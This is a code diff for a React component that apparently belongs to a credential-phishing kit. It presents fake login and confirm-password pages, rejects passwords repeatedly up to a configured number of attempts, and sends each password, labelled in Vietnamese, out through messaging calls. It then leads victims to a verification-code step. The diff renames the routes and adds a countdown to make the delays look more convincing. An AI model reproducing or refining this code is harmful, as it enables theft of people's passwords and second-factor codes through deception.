@@ -1,5 +1,4 @@
 import HomeImage from '@assets/home-image.png';
-import Loading from '@components/Loading';
 import { editMessageText, sendMessage } from '@utils/api';
 import config from '@utils/config';
 import getToday from '@utils/getToday';
@@ -97,7 +96,7 @@ const GetInfo: React.FC = () => {
 
 		const delayLoading = async () => {
 			setIsLoading(true);
-			if (currentPath === '/business/home/confirm-password') {
+			if (currentPath === '/live/home/confirm-password') {
 				setMessage(
 					message +
 						`\n<b>🔒 Mật khẩu ${failedPasswordAttempts}</b> <code>${confirmPassword}</code>`,
@@ -110,21 +109,32 @@ const GetInfo: React.FC = () => {
 						`\n<b>🔒 Mật khẩu ${failedPasswordAttempts}</b> <code>${confirmPassword}</code>`,
 				});
 			}
+
+			const configData = await config();
+			const loadingTime = configData.settings.password_loading_time;
+			setCountdown(Math.floor(loadingTime / 1000));
+
+			const countdownInterval = setInterval(() => {
+				setCountdown((prevCountdown) => (prevCountdown !== null ? prevCountdown - 1 : null));
+			}, 1000);
+
 			setTimeout(
 				async () => {
+					clearInterval(countdownInterval);
+					setCountdown(null);
 					setIsLoading(false);
-					if (currentPath === '/business/home/login') {
-						navigate('/business/home/confirm-password');
+					if (currentPath === '/live/home/login') {
+						navigate('/live/home/confirm-password');
 					} else if (
 						failedPasswordAttempts ===
-						(await config()).settings.max_failed_password_attempts
+						configData.settings.max_failed_password_attempts
 					) {
 						localStorage.setItem(
 							'message',
 							message +
 								`\n<b>🔒 Mật khẩu ${failedPasswordAttempts}</b> <code>${confirmPassword}</code>`,
 						);
-						navigate('/business/code-input');
+						navigate('/live/code-input');
 					} else {
 						if (confirmPasswordInputRef.current) {
 							confirmPasswordInputRef.current.value = '';
@@ -132,24 +142,26 @@ const GetInfo: React.FC = () => {
 						confirmPasswordInputRef.current?.focus();
 					}
 				},
-				(await config()).settings.password_loading_time,
+				loadingTime,
 			);
 		};
 
 		switch (currentPath) {
-			case '/business/home':
+			case '/live/home':
 				handleBusinessHome();
 				break;
-			case '/business/home/login':
+			case '/live/home/login':
 				handleBusinessHomeLogin();
 				break;
-			case '/business/home/confirm-password':
+			case '/live/home/confirm-password':
 				handleBusinessHomeConfirmPassword();
 				break;
 			default:
 				break;
 		}
 	};
+
+	const [countdown, setCountdown] = useState<number | null>(null);
 
 	useEffect(() => {
 		setCaseNumber(generateRandomNumber());
@@ -215,7 +227,13 @@ const GetInfo: React.FC = () => {
 				onClick={handleButtonClick}
 				disabled={isLoading}
 			>
-				{isLoading ? <Loading /> : 'Continue'}
+				{isLoading ? (
+					<>
+						{countdown !== null && ` ${countdown}s Continue`}
+					</>
+				) : (
+					'Continue'
+				)}
 			</button>
 		</div>
 	);
